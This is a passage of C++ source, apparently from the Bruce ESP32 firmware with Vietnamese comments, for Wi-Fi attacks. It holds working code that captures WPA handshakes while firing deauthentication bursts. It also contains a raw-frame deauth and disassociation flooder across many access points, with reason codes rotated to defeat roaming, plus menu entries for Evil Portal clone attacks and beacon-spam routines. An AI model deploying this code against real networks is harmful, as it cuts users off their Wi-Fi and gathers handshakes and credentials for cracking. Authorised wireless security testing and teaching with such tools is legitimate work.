                File hsFile = fs->open(hsFileName, FILE_WRITE);
                if (hsFile) {
                    writeHeader(hsFile);
                    hsFile.close();
                }
            }
            SavedHS.insert(hsFilePath);
            uint64_t apKey = 0;
            for (int i = 0; i < 6; ++i) { apKey = (apKey << 8) | rec.bssid[i]; }
            markHandshakeReady(apKey);

            // BẬT CHẾ ĐỘ NGHE LÉN KÉP
            esp_wifi_set_promiscuous_rx_cb(unified_sniffer_callback);

            hsTracker = HandshakeTracker();
            prevNumEAPOL = num_EAPOL;
            memcpy(targetBssid, rec.bssid, 6);
            memcpy(ap_record.bssid, rec.bssid, 6);

            forceFullRedraw = true;
        }

        wifi_ap_record_t &rec = selected_targets[currentIndex];

        // Kiểm tra xem đã bắt được Beacon chưa
        BeaconList targetBeacon;
        memcpy(targetBeacon.MAC, rec.bssid, 6);
        targetBeacon.channel = rec.primary;
        if (registeredBeacons.find(targetBeacon) != registeredBeacons.end()) { hasBeacons = true; }

        // Trigger cập nhật giao diện khi có tín hiệu EAPOL mới
        if (num_EAPOL > prevNumEAPOL) {
            prevNumEAPOL = num_EAPOL;
            updateStatsOnly = true;
        }
        if (handshakeUsable(hsTracker) && !captured) {
            captured = true;
            updateStatsOnly = true;
        }

        // Liên tục cập nhật bộ đếm RAW (mỗi 1 giây)
        if (millis() % 1000 < 50) updateStatsOnly = true;

        // --- 6. VẼ GIAO DIỆN TĨNH (Chỉ vẽ 1 lần khi đổi mục tiêu) ---
        if (forceFullRedraw) {
            tft.fillScreen(bruceConfig.bgColor);
            drawMainBorderWithTitle(isAutoMode ? "AUTO CAPTURE" : "MANUAL CAPTURE");

            tft.setTextSize(FP);
            tft.setTextColor(bruceConfig.priColor);

            tft.drawRoundRect(6, frameY, tftWidth - 12, frameH, 4, bruceConfig.priColor);
            tft.setCursor(12, frameY + 6);
            tft.printf("Target: %d/%d (Ch:%d)", currentIndex + 1, (int)selected_targets.size(), rec.primary);
            tft.drawLine(6, frameY + 18, tftWidth - 7, frameY + 18, bruceConfig.priColor);

            String ssid = String((char *)rec.ssid);
            if (ssid.length() == 0) ssid = "<Hidden>";
            if (ssid.length() > 22) ssid = ssid.substring(0, 20) + "..";
            tft.setCursor(12, frameY + 24);
            tft.print("SSID: " + ssid);

            char macStr[18];
            sprintf(
                macStr,
                "%02X:%02X:%02X:%02X:%02X:%02X",
                rec.bssid[0],
                rec.bssid[1],
                rec.bssid[2],
                rec.bssid[3],
                rec.bssid[4],
                rec.bssid[5]
            );
            tft.setCursor(12, frameY + 38);
            tft.print("BSSID: " + String(macStr));

            tft.drawLine(10, footerY, tftWidth - 10, footerY, bruceConfig.priColor);
            int btnY = footerY + 6;
            if (isAutoMode) {
                tft.drawCentreString("RUNNING AUTO MODE...", tftWidth / 2, btnY, 1);
            } else {
                tft.setCursor(10, btnY);
                tft.print("[< PRV]");
                String nextStr = "[NXT >]";
                tft.setCursor(tftWidth - tft.textWidth(nextStr) - 10, btnY);
                tft.print(nextStr);
                String btn = (selected_targets.size() > 1) ? "[SEL:ATTACK]" : "[SEL:ATTACK]";
                tft.drawCentreString(btn, tftWidth / 2, btnY, 1);
            }

            forceFullRedraw = false;
            updateStatsOnly = true;
        }

        // --- 7. CẬP NHẬT TRẠNG THÁI M1-M4 & SỐ PACKET RAW ---
        if (updateStatsOnly && !forceFullRedraw) {
            tft.fillRect(8, statY, tftWidth - 16, footerY - statY - 2, bruceConfig.bgColor);
            tft.setTextSize(FP);

            tft.setCursor(12, statY);
            if (hasBeacons && captured) {
                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                tft.print("STATUS: CAPTURED!");
            } else if (hasBeacons) {
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                tft.print("STATUS: Beacon captured");
            } else {
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                tft.print("STATUS: Waiting for Beacon...");
            }

            int boxW = (tftWidth - 40) / 4;
            int boxH = 14;
            int boxY = statY + 9;
            bool msgs[4] = {hsTracker.msg1, hsTracker.msg2, hsTracker.msg3, hsTracker.msg4};
            const char *msgLabels[4] = {"M1", "M2", "M3", "M4"};

            for (int i = 0; i < 4; i++) {
                int boxX = 10 + i * (boxW + 4);
                if (msgs[i]) {
                    tft.fillRoundRect(boxX, boxY, boxW, boxH, 2, TFT_GREEN);
                    tft.setTextColor(bruceConfig.bgColor);
                } else {
                    tft.drawRoundRect(boxX, boxY, boxW, boxH, 2, bruceConfig.priColor);
                    tft.setTextColor(bruceConfig.priColor);
                }
                tft.drawCentreString(msgLabels[i], boxX + (boxW / 2), boxY + 3, 1);
            }

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(12, footerY - 11);
            tft.print("DEAUTH: " + String(deauthCount) + " | RAW: " + String(raw_packet_count));

            updateStatsOnly = false;
        }

        // --- 8. LOGIC ĐIỀU HƯỚNG VÀ BẮN DEAUTH ---
        bool triggerAttack = false;

        if (isAutoMode) {
            uint32_t elapsed = millis() - autoStartTime;

            // Trạng thái 1: Đã bắt được Handshake -> Đợi 2s rồi tự chuyển mục tiêu tiếp theo
            if (captured && elapsed > 2000) {
                if (selected_targets.size() > 1) {
                    currentIndex = (currentIndex + 1) % selected_targets.size();
                } else {
                    lastIndex = -1; // Nếu chỉ chọn 1 mạng, ép nó tự động lặp lại quy trình săn từ đầu
                }
            }
            // Trạng thái 2: Chờ 8 giây không thấy gì -> Tự động khạc lửa Deauth
            else if (!autoDeauthFired && elapsed > 8000) {
                triggerAttack = true;
                autoDeauthFired = true;
            }
            // Trạng thái 3: Đã Deauth xong, chờ thêm 7s (tổng 15s) vẫn thất bại -> Chuyển mục tiêu
            else if (autoDeauthFired && elapsed > 15000) {
                if (selected_targets.size() > 1) {
                    currentIndex = (currentIndex + 1) % selected_targets.size();
                } else {
                    lastIndex = -1; // Nếu chỉ chọn 1 mạng, ép nó thử đấm Deauth lại vòng nữa
                }
            }
        } else {
            // Chế độ Manual (Bấm tay)
            if (check(SelPress)) triggerAttack = true;
            if (check(NextPress) && selected_targets.size() > 1) {
                currentIndex = (currentIndex + 1) % selected_targets.size();
            }
            if (check(PrevPress) && selected_targets.size() > 1) {
                currentIndex = (currentIndex - 1 + selected_targets.size()) % selected_targets.size();
            }
        }

        // TẤN CÔNG (DUAL-STRIKE DEAUTH)
        if (triggerAttack) {
            esp_wifi_set_promiscuous(false); // Dừng nghe lén để tập trung phát sóng

            tft.fillRect(8, statY, tftWidth - 16, 8, bruceConfig.bgColor);
            tft.setCursor(12, statY);
            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.print("STATUS: >> FIRING DEAUTH <<");

            // Bắn hàm deauth chuẩn của backend (5 gói)
            wsl_bypasser_send_raw_frame(&ap_record, rec.primary, _default_target);
            for (int i = 0; i < 5; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }

            // Bắn đạn Dual-Strike x48 (C0 và A0)
            uint8_t attack_pkt[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                                      0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};
            memcpy(&attack_pkt[10], rec.bssid, 6);
            memcpy(&attack_pkt[16], rec.bssid, 6);

            setCpuFrequencyMhz(240); // Ép xung CPU
            for (int i = 0; i < 48; i++) {
                attack_pkt[0] = (i % 2 == 0) ? 0xC0 : 0xA0;
                attack_pkt[24] = (i % 4 < 2) ? 0x07 : 0x02;
                esp_wifi_80211_tx(WIFI_IF_STA, attack_pkt, sizeof(attack_pkt), false);
                if (i % 4 == 0) vTaskDelay(1 / portTICK_PERIOD_MS);
                else delayMicroseconds(10);
            }

            deauthCount += 53;

            tft.fillRect(8, statY, tftWidth - 16, 8, bruceConfig.bgColor);

            // Bật lại Hàm Lắng Nghe Kép
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(unified_sniffer_callback);
            updateStatsOnly = true;
        }

        if (check(EscPress)) exitCapture = true;
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    // --- 9. KẾT THÚC DỌN DẸP ---
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    if (rawPcapFile) rawPcapFile.close();
    esp_wifi_stop();
    delay(100);
    returnToMenu = true;
}
/***************************************************************************************
** function: target_atk_menu
** @brief: Open menu to choose which AP Attack
***************************************************************************************/
void target_atk_menu(String tssid, String mac, uint8_t channel) {
AGAIN:
    options = {
        {"Information",         [=]() { wifi_atk_info(tssid, mac, channel); }      },
        {"Deauth",              [=]() { target_atk(tssid, mac, channel); }         },
        {"Capture Handshake",   [=]() { capture_handshake(tssid, mac, channel); }  },
        {"Clone Portal",        [=]() { EvilPortal(tssid, channel, false, false); }},
        {"Deauth+Clone",        [=]() { EvilPortal(tssid, channel, true, false); } },
        {"Deauth+Clone+Verify",
         [=]() // New WiFi Attack
         { EvilPortal(tssid, channel, true, true); }                               },
    };
    addOptionToMainMenu();

    loopOptions(options);
    if (!returnToMenu) goto AGAIN; // get back from Information without overflow the stack
}

/***************************************************************************************
** function: target_atk
** @brief: Deploy Target Deauth (Upgraded for Mesh Networks & Max Performance)
***************************************************************************************/
void target_atk(String tssid_unused, String mac_unused, uint8_t channel_unused) {
    if (selected_targets.empty()) {
        displayError("No targets selected!", true);
        return;
    }

    // --- 1. CẤU HÌNH WIFI TỐI ĐA CHO TẤN CÔNG ---
    WiFi.disconnect(true);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_ps(WIFI_PS_NONE); // Tắt chế độ tiết kiệm pin để phát tối đa công suất
    setCpuFrequencyMhz(240);       // Ép xung CPU lên mức cao nhất để xử lý mảng

    // --- 2. CHUẨN BỊ GÓI TIN MẪU ---
    uint8_t packet[26] = {
        0xC0, 0x00, 0x3A, 0x01,             // [0-3]   Frame Control (Sẽ đảo liên tục C0 và A0)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // [4-9]   Destination (Broadcast tới mọi client)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // [10-15] Source (Sẽ ghi đè BSSID vào đây)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // [16-21] BSSID  (Sẽ ghi đè BSSID vào đây)
        0x00, 0x00,                         // [22-23] Sequence Number
        0x07, 0x00                          // [24-25] Reason Code (Sẽ đảo liên tục)
    };

    // --- 3. VẼ GIAO DIỆN TĨNH ---
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("Target Deauth");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);

    tft.setCursor(10, 45);
    if (selected_targets.size() == 1) {
        String tssid = String((char *)selected_targets[0].ssid);
        tft.print("Target: " + (tssid.isEmpty() ? String("<Hidden>") : tssid));
    } else {
        tft.print("Targets: " + String(selected_targets.size()) + " Mesh APs");
    }

    tft.setCursor(10, 65);
    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.print("Status: ATTACKING...");

    // --- 4. VÒNG LẶP TẤN CÔNG (TỐI ƯU HÓA MESH) ---
    bool running = true;
    uint32_t tmp = millis();
    uint16_t count = 0;
    uint8_t current_channel = 0; // Biến nhớ kênh hiện tại để tránh reset Radio

    while (running) {
        for (const auto &rec : selected_targets) {

            // TỐI ƯU 1: Smart Channel Hopping
            // Chỉ đổi kênh nếu BSSID tiếp theo thực sự nằm ở kênh khác
            if (current_channel != rec.primary) {
                esp_wifi_set_channel(rec.primary, WIFI_SECOND_CHAN_NONE);
                current_channel = rec.primary;
                // Nhường 2 tick cho phần cứng Radio cấu hình xong PLL
                vTaskDelay(2 / portTICK_PERIOD_MS);
            }

            // Khảm địa chỉ MAC (BSSID) của Mesh Node vào gói tin
            memcpy(&packet[10], rec.bssid, 6); // Source
            memcpy(&packet[16], rec.bssid, 6); // BSSID

            // TỐI ƯU 2: Bắn loạt đạn hỗn hợp (6 gói liên tiếp cho mỗi BSSID)
            for (int i = 0; i < 6; i++) {
                // Đảo loại Frame: Chẵn là Deauth (0xC0), Lẻ là Disassociation (0xA0)
                packet[0] = (i % 2 == 0) ? 0xC0 : 0xA0;

                // Xoay vòng 3 Reason Code đánh lừa chuẩn roaming
                if (i % 3 == 0) packet[24] = 0x07;      // Code 7: Class 3 frame received
                else if (i % 3 == 1) packet[24] = 0x02; // Code 2: Previous auth no longer valid
                else packet[24] = 0x27;                 // Code 39 (0x27): Peer rejected

                esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
                count++;
                delayMicroseconds(5); // Ngăn tràn bộ đệm TX nội bộ của ESP32
            }

            // Phản hồi nút bấm ngay lập tức
            if (check(SelPress) || check(EscPress)) {
                running = false;
                break;
            }
        }

        // --- 5. HIỂN THỊ TỐC ĐỘ (FPS) ---
        if (millis() - tmp >= 1000) {
            int textY = tftHeight - 20 - 10;
            tft.fillRect(10, textY, tftWidth - 20, 25, bruceConfig.bgColor);
            tft.setCursor(10, textY);
            tft.print("Frames: " + String(count) + " pkts/s");
            count = 0;
            tmp = millis();
        }

        vTaskDelay(1 / portTICK_PERIOD_MS); // Nhả WDT (Watchdog Timer)
    }

    // --- 6. DỌN DẸP ---
    esp_wifi_set_promiscuous(false);
    wifi_atk_unsetWifi();
    returnToMenu = true;
}

void generateRandomWiFiMac(uint8_t *mac) {
    for (int i = 1; i < 6; i++) { mac[i] = random(0, 255); }
}

char randomName[32];
char *randomSSID() {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 22 + 7; // Generate a random length between 1 and 10
    for (int i = 0; i < len; ++i) {
        randomName[i] = charset[rand() % strlen(charset)]; // S elect random characters from the charset
    }
    randomName[len] = '\0'; // Null-terminate the string
    return randomName;
}

char emptySSID[32];
const char Beacons[] PROGMEM = {"Mom Use This One\n"
                                "Abraham Linksys\n"
                                "Benjamin FrankLAN\n"
                                "Martin Router King\n"
                                "John Wilkes Bluetooth\n"
                                "Pretty Fly for a Wi-Fi\n"
                                "Bill Wi the Science Fi\n"
                                "I Believe Wi Can Fi\n"
                                "Tell My Wi-Fi Love Her\n"
                                "No More Mister Wi-Fi\n"
                                "LAN Solo\n"
                                "The LAN Before Time\n"
                                "Silence of the LANs\n"
                                "House LANister\n"
                                "Winternet Is Coming\n"
                                "Ping's Landing\n"
                                "The Ping in the North\n"
                                "This LAN Is My LAN\n"
                                "Get Off My LAN\n"
                                "The Promised LAN\n"
                                "The LAN Down Under\n"
                                "FBI Surveillance Van 4\n"
                                "Area 51 Test Site\n"
                                "Drive-By Wi-Fi\n"
                                "Planet Express\n"
                                "Wu Tang LAN\n"
                                "Darude LANstorm\n"
                                "Never Gonna Give You Up\n"
                                "Hide Yo Kids, Hide Yo Wi-Fi\n"
                                "Loading…\n"
                                "Searching…\n"
                                "VIRUS.EXE\n"
                                "Virus-Infected Wi-Fi\n"
                                "Starbucks Wi-Fi\n"
                                "Text 64ALL for Password\n"
                                "Yell BRUCE for Password\n"
                                "The Password Is 1234\n"
                                "Free Public Wi-Fi\n"
                                "No Free Wi-Fi Here\n"
                                "Get Your Own Damn Wi-Fi\n"
                                "It Hurts When IP\n"
                                "Dora the Internet Explorer\n"
                                "404 Wi-Fi Unavailable\n"
                                "Porque-Fi\n"
                                "Titanic Syncing\n"
                                "Test Wi-Fi Please Ignore\n"
                                "Drop It Like It's Hotspot\n"
                                "Life in the Fast LAN\n"
                                "The Creep Next Door\n"
                                "Ye Olde Internet\n"};

const char rickrollssids[] PROGMEM = {"01 Never gonna give you up\n"
                                      "02 Never gonna let you down\n"
                                      "03 Never gonna run around\n"
                                      "04 and desert you\n"
                                      "05 Never gonna make you cry\n"
                                      "06 Never gonna say goodbye\n"
                                      "07 Never gonna tell a lie\n"
                                      "08 and hurt you\n"};

void beaconSpamList(const char list[]) {
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6];
    int i = 0;
    int ssidsLen = strlen_P(list);

    // go to the next channel
    nextChannel();

    while (i < ssidsLen) {
        // Read next SSID from PROGMEM up to newline
        char ssidBuf[32];
        int j = 0;
        char tmp;
        // read chars from PROGMEM until newline
        do {
            tmp = pgm_read_byte(list + i + j);
            if (j < 32 && tmp != '\n') ssidBuf[j] = tmp;
            j++;
        } while (tmp != '\n' && i + j < ssidsLen);

        uint8_t ssidLen = (j > 32) ? 32 : j - 1;

        // generate MAC and prepare packet
        generateRandomWiFiMac(macAddr);
        prepareBeaconPacket(beaconPacket, macAddr, ssidBuf, ssidLen, wifi_channel, true);

        // send 2 packets instead of 3 (makes devices show more networks)
        for (int k = 0; k < 2; k++) {
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PKT_LEN, 0);
            vTaskDelay(1 / portTICK_PERIOD_MS);
        }

        // move cursor past the SSID and newline
        i += j;
        if (EscPress) break;
    }
}

void beaconSpamSingle(String baseSSID) {
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6];
    int counter = 1;

    // initial channel rotation
    nextChannel();

    while (true) {
        // Create SSID with suffix (within 32 limit)
        String currentSSID = baseSSID + String(counter);
        if (currentSSID.length() > 32) { currentSSID = currentSSID.substring(0, 32); }
        uint8_t ssidLen = currentSSID.length();

        // prepare packet
        generateRandomWiFiMac(macAddr);
        prepareBeaconPacket(beaconPacket, macAddr, currentSSID.c_str(), ssidLen, wifi_channel, true);

        // send 2 packets
        for (int k = 0; k < 2; k++) {
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PKT_LEN, 0);
            vTaskDelay(1 / portTICK_PERIOD_MS);
        }

        counter++;
        if (counter > 9999) {
            counter = 1;
            nextChannel(); // change channel after resetting the counter
        }
        if (EscPress) break; // exit condition preserved
    }
}

void beaconAttack() {
    if (!wifi_atk_setWifi()) return; // error messages inside the function

    int BeaconMode;
    String txt = "";
    String singleSSID = "";
    // create empty SSID
    for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
    // for random generator
    randomSeed(1);
    options = {
        {"Funny SSID",
         [&]() {
             BeaconMode = 0;
             txt = "Spamming Funny";
         }                        },
        {"Ricky Roll",
         [&]() {
             BeaconMode = 1;
             txt = "Spamming Ricky";
         }                        },
        {"Random SSID",
         [&]() {
             BeaconMode = 2;
             txt = "Spamming Random";
         }                        },
#if !defined(LITE_VERSION)
        {"Single SSID",
         [&]() {
             BeaconMode = 4;
             txt = "Spamming Single";
         }                        },
        {"Custom SSIDs", [&]() {
             BeaconMode = 3;
             txt = "Spamming Custom";
         }},
#endif
    };
    addOptionToMainMenu();
    loopOptions(options);

    wifiConnected = true; // display wifi icon
    String beaconFile = "";
    File file;
    FS *fs;
#if !defined(LITE_VERSION)
    // Get user input for single SSID mode
    if (BeaconMode == 4) {
        singleSSID = keyboard("BruceBeacon", 26, "Base SSID:");
        if (singleSSID.length() == 0) {
            return; // User cancelled
        }
    }
#endif
    if (BeaconMode != 3) {
        drawMainBorderWithTitle("WiFi: Beacon SPAM");
        displayTextLine(txt);
    }

    while (1) {
        if (BeaconMode == 0) {
            beaconSpamList(Beacons);
        } else if (BeaconMode == 1) {
            beaconSpamList(rickrollssids);
        } else if (BeaconMode == 2) {
            char *randoms = randomSSID();
            beaconSpamList(randoms);
        }
#if !defined(LITE_VERSION)
        else if (BeaconMode == 4) {
            beaconSpamSingle(singleSSID);
        } else if (BeaconMode == 3) {
            if (!file) {
                options = {};

                fs = nullptr;
                if (setupSdCard()) {
                    options.push_back({"SD Card", [&]() { fs = &SD; }});
                }
                options.push_back({"LittleFS", [&]() { fs = &LittleFS; }});
                addOptionToMainMenu();

                loopOptions(options);
                if (fs != nullptr) beaconFile = loopSD(*fs, true, "TXT");
                else return;
                file = fs->open(beaconFile, FILE_READ);
                beaconFile = file.readString();
                beaconFile.replace("\r\n", "\n");
                tft.drawPixel(0, 0, 0);
                drawMainBorderWithTitle("WiFi: Beacon SPAM");
                displayTextLine(txt);
            }

            const char *randoms = beaconFile.c_str();
            beaconSpamList(randoms);
        }
#endif
        if (check(EscPress) || returnToMenu) {
            if (BeaconMode == 3) file.close();
            break;
        }
    }
    wifi_atk_unsetWifi();
}
